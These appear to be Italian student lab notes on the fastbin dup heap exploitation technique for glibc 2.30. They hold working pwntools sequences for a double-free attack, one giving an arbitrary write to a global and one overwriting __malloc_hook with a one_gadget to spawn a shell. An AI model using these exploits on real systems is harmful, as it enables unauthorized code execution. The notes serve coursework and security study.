# Fastbin Dup lab

## Stato

|Lab|Stato|
|---|---|
|House of Force|✅ completato|
|Fastbin Dup|✅ completato|
|Phase 2 (CTF)|⏳ scadenza 26/06 23.59|

> [!warning] Scadenza oggi Consegna flag + report entro **26 giugno 23.59**.

---

## Teoria — Fastbin

- **Fastbin** = singly-linked list LIFO per chunk 0x20–0x80. Nessuna coalescenza.
- `fd` = primo campo del user data quando il chunk è libero. Punta al chunk libero precedente.
- `free()` = push in testa. `malloc()` = pop dalla testa.
- `fastbins[]` vive nell'arena (`main_arena`), accessibile con `p/x main_arena` in GDB.

> [!info] Double-free check glibc 2.30 glibc 2.30 controlla **solo la testa** della fastbin — non scende un livello. Sequenza sicura: `free(B) → free(A) → free(B)`. La seconda `free(B)` trova `A` in testa, `A ≠ B` → check passa. Risultato: `B→A→B` in fastbin.

> [!info] Size check su malloc Quando malloc preleva un chunk dal fastbin, controlla che `*(chunk + 8)` sia coerente con la size class. Il fake chunk deve avere un field `size` compatibile — da qui la necessità di `find-fake-fast` o di costruire un fake chunk controllato.

---

## Approccio A — find-fake-fast (generico)

### Idea

Cerca in memoria byte casuali che passino il size check, senza controllare nessun campo vicino al target.

```
pwndbg> find-fake-fast &target
→ Addr: 0x403fed
→ size: 0x78 (with flag bits: 0x7f) → fastbin 0x70 → malloc(0x68)
```

### Calcoli

```python
fake_chunk = 0x403fed          # fisso, No PIE
user_ptr   = fake_chunk + 0x10 # = 0x403ffd
target     = 0x404020
offset     = target - user_ptr # = 0x23
```

### Sequenza

```python
# Setup: B→A→B in fastbin 0x70
chunk_A = malloc(0x68, b"A" * 0x68)
chunk_B = malloc(0x68, b"B" * 0x68)
free(chunk_B); free(chunk_A); free(chunk_B)

# Exploit
malloc(0x68, p64(fake_chunk))              # pop B, inietta fake_chunk in fd
malloc(0x68, b"X" * 0x68)                 # pop A
malloc(0x68, b"X" * 0x68)                 # pop B
malloc(0x68, b"A" * offset + b"pwned\0")  # pop fake_chunk → scrive su target
```

> [!note] Quando usarlo Quando non controlli nessun campo di memoria vicino al target. Cerca byte già presenti che passino il size check per caso.

---

## Approccio B — fake chunk controllato (del prof)

### Idea

Usa `username` come size field del fake chunk. Poiché `username` è un input controllato, ci scrivi direttamente il valore che passa il size check.

### Geometria

```
elf.sym.user - 8   →  [ prev_size (8B)   ]  qualsiasi
elf.sym.user       →  [ size|flags (8B)  ]  ← username[0:8] = p64(0x31)
elf.sym.user + 8   →  [ user data        ]  ← user pointer dopo malloc
elf.sym.user + 16  →  [ target field     ]  ← quello da sovrascrivere
```

`p64(0x31)` = `0x30 | PREV_INUSE` → size class 0x30 → `malloc(0x28)`.

### Sequenza (variante con __malloc_hook)

```python
io.sendafter(b"username: ", p64(0x31))   # username = size field del fake chunk

chunk_A = malloc(0x68, b"A" * 0x68)
chunk_B = malloc(0x68, b"B" * 0x68)
free(chunk_B); free(chunk_A); free(chunk_B)

fake_chunk = libc.sym.__malloc_hook - 0x23   # da find-fake-fast
malloc(0x68, p64(fake_chunk))                # inietta fd
malloc(0x68, b"1" * 0x68)                   # consuma A
malloc(0x68, b"2" * 0x68)                   # consuma B

one_gadget = libc.address + 0xE1FA1
payload = b"H" * 0x13 + p64(one_gadget)
malloc(0x68, payload)                        # scrive one_gadget su __malloc_hook

malloc(0x01, b"\x00")                        # trigger → shell
```

> [!note] Quando usarlo Quando controlli un campo di memoria vicino al target. Più affidabile di find-fake-fast perché non dipende da byte casuali.

---

## Differenze tra i due approcci

| |Approccio A|Approccio B|
|---|---|---|
|Fake chunk|trovato in memoria (byte casuali)|costruito controllando `username`|
|Size class|0x70 (`malloc(0x68)`)|0x30 (`malloc(0x28)`)|
|Target|variabile globale `.data`|`__malloc_hook` in libc|
|Primitiva finale|write arbitraria|code execution via one gadget|
|Dipendenza|byte casuali in posizione giusta|campo input controllabile vicino al target|

---

## One gadget vs ROP gadget

| |ROP gadget|One gadget|
|---|---|---|
|Dove sta|nel binario|in libc|
|Come si usa|catena di più gadget|salto singolo|
|Flessibilità|costruisci quello che vuoi|funziona solo se i vincoli su registri sono soddisfatti|
|Quando si usa|controllo totale dello stack|singolo puntatore a funzione da sovrascrivere|

---

## Setup tecnico (memo)

- `DEMO_MODE=1 ./exploit-template.py GDB=1` → pause automatiche con `demo()`.
- `fastbins` in pwndbg → visualizza la linked list.
- `find-fake-fast &simbolo` → cerca fake chunk vicino al target.
- `one_gadget libc.so` da terminale → lista gadget con vincoli su registri.
- `p/x main_arena.top` → indirizzo corrente del top chunk.
- `MAX_CHUNKS = 7` — tenere il conto: setup + exploit ≤ 7.

---

## Lezioni apprese

- Il double-free check di glibc 2.30 controlla solo la testa → `B→A→B` funziona, `A→A` no.
- Con 3 chunk la catena `A→C→B→A` richiede 5 malloc exploit → supera MAX_CHUNKS. Con 2 chunk bastano 4.
- `find-fake-fast` è la tecnica generale; il fake chunk controllato è una scorciatoia quando il binario offre un campo input vicino al target.
- `__malloc_hook` è scrivibile da qualsiasi codice nello stesso processo — non serve nessun permesso speciale.
- `__malloc_hook` rimosso dopo glibc 2.34 → tecnica valida solo su glibc ≤ 2.34.